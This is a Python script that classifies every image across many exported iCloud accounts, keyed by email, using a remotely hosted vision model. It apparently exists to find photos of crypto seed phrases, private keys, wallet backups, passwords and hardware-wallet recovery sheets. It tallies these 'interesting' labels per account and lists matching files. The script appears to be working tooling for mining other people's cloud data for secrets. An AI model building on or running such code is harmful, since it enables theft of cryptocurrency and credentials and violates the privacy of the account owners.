#!/usr/bin/env python3
"""Classify every photo of every exported iCloud account, local and S4-only.

    classify_all.py [--phase local|s4|all] [--concurrency 128]
                    [--accounts a@b.com,c@d.com] [--limit N] [--retry-failed]

Local photos are read from /opt/icloud3/export and /opt/icloud3/export-overflow
(account symlinks are de-duplicated by real path).  A cached 640 px thumbnail
(Scan/thumbs/<rel>.jpg) is preferred over the original, so almost nothing has
to be decoded at full resolution.

Photos that were pruned from disk live in the S4 bucket; they are classified
from their 640 px thumbnail when one was uploaded, otherwise from the original.
Only a batch of a few thousand files is staged on disk at a time and deleted
right after it has been labelled.

One global results file, keyed "<email>/<rel_path>", so a rerun after a kill
(or after new photos finish downloading) only processes what is still missing.

    /opt/icloud3/classify/results.jsonl     append-only, fsynced
    /opt/icloud3/classify/photos.csv       one row per known photo
    /opt/icloud3/classify/summary.json     counts per label
"""
from __future__ import annotations

import argparse
import csv
import fcntl
import json
import os
import shutil
import subprocess
import sys
import threading
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import classify as core  # noqa: E402

EXPORT_ROOTS = (Path("/opt/icloud3/export"), Path("/opt/icloud3/export-overflow"))
REMOTE = "s4:icld"
OUT_DIR = Path("/opt/icloud3/classify")
RESULTS = OUT_DIR / "results.jsonl"
CSV_PATH = OUT_DIR / "photos.csv"
SUMMARY = OUT_DIR / "summary.json"
PROGRESS = OUT_DIR / "progress.json"
STAGE = OUT_DIR / "staging"
LOG = OUT_DIR / "classify_all.log"

INTERESTING = ("seed", "seed-candidate", "privatekey", "wallet", "recover",
               "backup", "password", "ledger", "trezor", "safe", "exchange")


def log(message: str) -> None:
    # stdout goes to classify_all.log through the launcher's redirect.
    print(time.strftime("%Y-%m-%d %H:%M:%S ") + message, flush=True)


def account_roots() -> dict[str, Path]:
    """email -> real account directory, symlinks and duplicate copies removed."""
    found: dict[str, Path] = {}
    seen_real: set[Path] = set()
    for base in EXPORT_ROOTS:
        if not base.is_dir():
            continue
        for name in sorted(os.listdir(base)):
            path = base / name
            if not path.is_dir():
                continue
            real = Path(os.path.realpath(path))
            if real in seen_real:
                continue
            seen_real.add(real)
            found.setdefault(name, real)
    return found


def local_photos(root: Path) -> list[Path]:
    """Every image in the account, not only Photos/.

    Notes attachments, Drive pictures and Mail images are photos the operator
    can search too, and they were being left out of the label pass.
    """
    if not root.is_dir():
        return []
    items: list[Path] = []
    for base, dirs, names in os.walk(root):
        dirs[:] = [d for d in dirs if d not in ("Scan", "zips", ".thumbnails")]
        for name in names:
            if name.endswith((".part", ".tmp")):
                continue
            if Path(name).suffix.lower() in core.IMAGE_EXT:
                items.append(Path(base) / name)
    return items


def bucket_listing(email: str, root: Path) -> list[str]:
    """Photo paths that exist in the bucket for this account."""
    manifest = root / "Scan" / "s4-manifest.json"
    if manifest.is_file():
        try:
            payload = json.loads(manifest.read_text())
            files = payload.get("files") if isinstance(payload, dict) else payload
            return [str(item.get("p") if isinstance(item, dict) else item) for item in files]
        except Exception as error:  # noqa: BLE001
            log(f"{email} manifest unreadable ({type(error).__name__}), listing bucket")
    process = subprocess.run(
        ["rclone", "lsf", f"{REMOTE}/{email}/Photos", "-R", "--files-only"],
        capture_output=True, text=True, timeout=1800,
    )
    if process.returncode != 0:
        log(f"{email} rclone lsf failed: {process.stderr.strip()[:160]}")
        return []
    return ["Photos/" + line.strip() for line in process.stdout.splitlines() if line.strip()]


def rclone_copy(email: str, keys: list[str], stage_root: Path) -> int:
    """Fetch `keys` (paths relative to the account) into stage_root/<email>."""
    if not keys:
        return 0
    listing = stage_root / f"{email}.list"
    listing.parent.mkdir(parents=True, exist_ok=True)
    listing.write_text("\n".join(keys) + "\n")
    target = stage_root / email
    process = subprocess.run(
        ["rclone", "copy", f"{REMOTE}/{email}", str(target),
         "--files-from-raw", str(listing), "--transfers", "48", "--checkers", "64",
         "--no-traverse", "--retries", "3", "--low-level-retries", "5", "--stats", "0"],
        capture_output=True, text=True, timeout=7200,
    )
    if process.returncode != 0:
        log(f"{email} rclone copy rc={process.returncode}: {process.stderr.strip()[-200:]}")
    return process.returncode


class Writer:
    """Append-only results writer, one line per photo, fsync every N."""

    def __init__(self, path: Path, every: int = 100):
        self.handle = path.open("a", buffering=1)
        self.every = every
        self.pending = 0
        self.lock = threading.RLock()  # write() flushes while holding it

    def write(self, row: dict) -> None:
        with self.lock:
            self.handle.write(json.dumps(row) + "\n")
            self.pending += 1
            if self.pending >= self.every:
                self.flush()

    def flush(self) -> None:
        with self.lock:
            self.handle.flush()
            os.fsync(self.handle.fileno())
            self.pending = 0

    def close(self) -> None:
        self.flush()
        self.handle.close()


def run_stage(classifier: core.Classifier, items: list[tuple[str, Path]], workers: int,
              writer: Writer, tag: str, counter: dict, started: float) -> None:
    """Classify one batch and account for progress/ETA across the whole run."""
    if not items:
        return

    def record(row: dict) -> None:
        writer.write(row)
        counter["done"] += 1
        if row["status"] == "ok":
            counter["ok"] += 1
        elif row["status"] == "invalid_label":
            counter["invalid"] += 1
        else:
            counter["failed"] += 1
        if counter["done"] % 200 == 0 or counter["done"] == counter["total"]:
            write_progress(counter, started, tag)
            elapsed = max(0.001, time.time() - started)
            rate = counter["done"] / elapsed
            left = max(0, counter["total"] - counter["done"])
            eta = left / rate if rate else 0
            log(f"{counter['done']}/{counter['total']} · {rate:.1f}/s · "
                f"ETA {int(eta // 60)}m{int(eta % 60):02d}s · ok {counter['ok']} · "
                f"failed {counter['failed']} · invalid {counter['invalid']} · {tag}")

    core.run_pool(classifier, items, workers, on_result=record)


def write_progress(counter: dict, started: float, phase: str) -> None:
    """Small file the panel polls; written every 200 photos."""
    elapsed = max(0.001, time.time() - started)
    rate = counter["done"] / elapsed
    left = max(0, counter["total"] - counter["done"])
    payload = {
        "at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "phase": phase,
        "done": counter["done"],
        "total": counter["total"],
        "ok": counter["ok"],
        "failed": counter["failed"],
        "invalid": counter["invalid"],
        "rate": round(rate, 1),
        "etaSeconds": int(left / rate) if rate else 0,
        "elapsed": int(elapsed),
    }
    try:
        temporary = PROGRESS.with_suffix(".tmp")
        temporary.write_text(json.dumps(payload))
        os.replace(temporary, PROGRESS)
    except OSError:
        pass


def build_known(accounts: dict[str, Path], include_s4: bool) -> tuple[list, list]:
    """Return (local items, s4-only rel list) for the whole corpus."""
    local_items: list[tuple[str, Path]] = []
    s4_only: list[tuple[str, str]] = []
    for email, root in sorted(accounts.items()):
        photos = local_photos(root)
        for path in photos:
            rel = path.relative_to(root).as_posix()
            source = os.environ.get("CLASSIFY_NO_THUMBS") and path
            local_items.append((f"{email}/{rel}", source or core.thumb_of(root, path) or path))
        if include_s4:
            on_disk = {path.relative_to(root).as_posix() for path in photos}
            for rel in bucket_listing(email, root):
                if rel in on_disk:
                    continue
                if Path(rel).suffix.lower() not in core.IMAGE_EXT:
                    continue
                # The prune keeps Scan/thumbs on disk, so a photo that was
                # removed from Photos/ can still be labelled without touching
                # the bucket at all.
                thumb = root / "Scan" / "thumbs" / f"{rel}.jpg"
                if thumb.is_file() and thumb.stat().st_size > 0:
                    local_items.append((f"{email}/{rel}", thumb))
                else:
                    s4_only.append((email, rel))
    return local_items, s4_only


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--phase", choices=("local", "s4", "all"), default="all")
    parser.add_argument("--concurrency", type=int, default=128)
    parser.add_argument("--decode-workers", type=int, default=6)
    parser.add_argument("--accounts", default="", help="comma separated email allowlist")
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--batch", type=int, default=2000, help="S4 stage batch size")
    parser.add_argument("--retry-failed", action="store_true")
    parser.add_argument("--force", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--report", action="store_true", help="only print the label summary")
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    args = parser.parse_args()

    OUT_DIR.mkdir(parents=True, exist_ok=True)
    done = core.load_results(RESULTS)

    if args.report:
        report(done, args)
        return

    lock_handle = (OUT_DIR / "run.lock").open("w")
    try:
        fcntl.flock(lock_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
    except OSError:
        log("another classify_all run holds the lock")
        return

    account_filter = {a.strip() for a in args.accounts.split(",") if a.strip()}
    accounts = account_roots()
    if account_filter:
        accounts = {k: v for k, v in accounts.items() if k in account_filter}
    log(f"{len(accounts)} accounts")

    core._DECODE = threading.BoundedSemaphore(max(1, args.decode_workers))
    classifier = core.Classifier(args.base_url, args.model, concurrency=args.concurrency)
    if not classifier.key:
        log("warning: no VISION_API_KEY / VLLM_API_KEY in the environment")

    local_items, s4_only = build_known(accounts, include_s4=args.phase in ("s4", "all"))
    log(f"known photos: {len(local_items)} local · {len(s4_only)} S4-only")

    todo_local = [
        item for item in local_items
        if args.force or not skippable(done.get(item[0]), args.retry_failed)
    ]
    if args.limit:
        todo_local = todo_local[: args.limit]
    log(f"local to classify: {len(todo_local)}")

    writer = Writer(RESULTS)
    counter = {"done": 0, "ok": 0, "failed": 0, "invalid": 0,
               "total": len(todo_local) + len(s4_only)}
    started = time.time()
    write_progress(counter, started, "starting")
    try:
        if args.phase in ("local", "all") and not args.dry_run:
            run_stage(classifier, todo_local, args.concurrency, writer, "local", counter, started)

        if args.phase in ("s4", "all") and not args.dry_run:
            by_account: dict[str, list[str]] = {}
            for email, rel in s4_only:
                if args.force or not skippable(done.get(f"{email}/{rel}"), args.retry_failed):
                    by_account.setdefault(email, []).append(rel)
            log(f"S4 to classify: {sum(len(v) for v in by_account.values())} photos "
                f"in {len(by_account)} accounts")
            for index, (email, rels) in enumerate(sorted(by_account.items()), 1):
                root = accounts[email]
                for start in range(0, len(rels), args.batch):
                    chunk = rels[start:start + args.batch]
                    stage = STAGE / f"{email}-{start}"
                    thumbs = [f"Scan/thumbs/{rel}.jpg" for rel in chunk]
                    rclone_copy(email, thumbs, stage)
                    items: list[tuple[str, Path]] = []
                    missing: list[str] = []
                    for rel in chunk:
                        staged = stage / email / "Scan" / "thumbs" / f"{rel}.jpg"
                        if staged.is_file() and staged.stat().st_size > 0:
                            items.append((f"{email}/{rel}", staged))
                        else:
                            missing.append(rel)
                    if missing:
                        rclone_copy(email, missing, stage)
                        for rel in missing:
                            staged = stage / email / rel
                            if staged.is_file() and staged.stat().st_size > 0:
                                items.append((f"{email}/{rel}", staged))
                            else:
                                writer.write({"rel_path": f"{email}/{rel}", "label": "",
                                              "status": "error", "error": "not-in-bucket",
                                              "ms": 0, "model": args.model})
                                counter["done"] += 1
                                counter["failed"] += 1
                    run_stage(classifier, items, args.concurrency, writer,
                              f"s4 {email} {index}/{len(by_account)}", counter, started)
                    shutil.rmtree(stage, ignore_errors=True)
                log(f"{email} done · {counter['ok']} ok so far")
    finally:
        writer.close()
        write_progress(counter, started, "finished")

    rows = core.load_results(RESULTS)
    write_csv(local_items, s4_only, rows)
    write_summary(rows, accounts, args)
    log(f"finished · {counter['ok']} ok · {counter['failed']} failed · "
        f"{counter['invalid']} invalid · {time.time() - started:.0f}s")


def skippable(row: dict | None, retry_failed: bool) -> bool:
    if not row:
        return False
    if row.get("status") == "ok":
        return True
    return not retry_failed


def write_csv(local_items, s4_only, rows: dict[str, dict]) -> None:
    known = [rel for rel, _ in local_items] + [f"{email}/{rel}" for email, rel in s4_only]
    with CSV_PATH.open("w", newline="") as handle:
        writer = csv.writer(handle)
        writer.writerow(["rel_path", "label", "status", "error"])
        for rel in known:
            row = rows.get(rel) or {}
            writer.writerow([rel, row.get("label", ""), row.get("status", "missing"),
                             row.get("error", "")])


def write_summary(rows: dict[str, dict], accounts: dict[str, Path], args) -> None:
    labels: dict[str, int] = {}
    ok = failed = invalid = 0
    per_account: dict[str, dict[str, int]] = {}
    for rel, row in rows.items():
        status = row.get("status")
        if status == "ok":
            ok += 1
            labels[row["label"]] = labels.get(row["label"], 0) + 1
            email = rel.split("/", 1)[0]
            per_account.setdefault(email, {})[row["label"]] = \
                per_account.setdefault(email, {}).get(row["label"], 0) + 1
        elif status == "invalid_label":
            invalid += 1
        else:
            failed += 1
    summary = {
        "model": args.model,
        "accounts": len(accounts),
        "classified": len(rows),
        "ok": ok,
        "failed": failed,
        "invalid_label": invalid,
        "labels": dict(sorted(labels.items(), key=lambda item: -item[1])),
        "interestingByAccount": {
            email: {label: count for label, count in counts.items() if label in INTERESTING}
            for email, counts in per_account.items()
            if any(label in INTERESTING for label in counts)
        },
    }
    SUMMARY.write_text(json.dumps(summary, indent=1))


def report(rows: dict[str, dict], args) -> None:
    counts: dict[str, int] = {}
    for row in rows.values():
        if row.get("status") == "ok":
            counts[row["label"]] = counts.get(row["label"], 0) + 1
    log(f"{len(rows)} classified · " + " · ".join(
        f"{label} {count}" for label, count in sorted(counts.items(), key=lambda i: -i[1])))
    for label in INTERESTING:
        hits = [rel for rel, row in rows.items() if row.get("label") == label]
        if hits:
            log(f"{label}: {len(hits)}")
            for rel in hits[:10]:
                log(f"   {rel}")


if __name__ == "__main__":
    main()
